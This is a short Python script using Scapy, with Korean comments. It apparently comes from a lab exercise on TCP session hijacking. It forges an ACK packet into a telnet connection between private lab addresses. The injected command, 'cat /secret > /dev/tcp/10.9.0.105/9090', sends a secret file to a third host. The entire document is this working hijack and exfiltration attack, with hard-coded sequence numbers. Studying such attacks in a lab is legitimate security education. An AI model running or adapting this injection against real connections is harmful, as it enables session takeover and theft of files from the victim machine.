import sys
from scapy.all import *

print("Sending Hijacking Packet")
IPLayer = IP(src="10.9.0.5", dst = "10.9.0.69") # 출발과 도착 IP 주소에 대해 IP 레이어 정의
TCPLayer = TCP(sport=52789, dport = 23, flags="A", seq = 2159590966, ack = 2351669314) # 출발과 도착지의 포트,
                                    #Acknowledgment 플래그 설정, 패킷 시퀀스 번호 지정에 대한 TCP 레이어 정의
Data = "\r cat /secret > /dev/tcp/10.9.0.105/9090\r" #/secret 파일의 내용을 10.9.0.105:9090으로 전송
pkt = IPLayer/TCPLayer/Data # IPLayer, TCPLayer, Data를 결합하여 하나의 패킷 형성
send(pkt, verbose=0, iface='eth0') # 패킷 eth0으로 전송, 출력 정보 X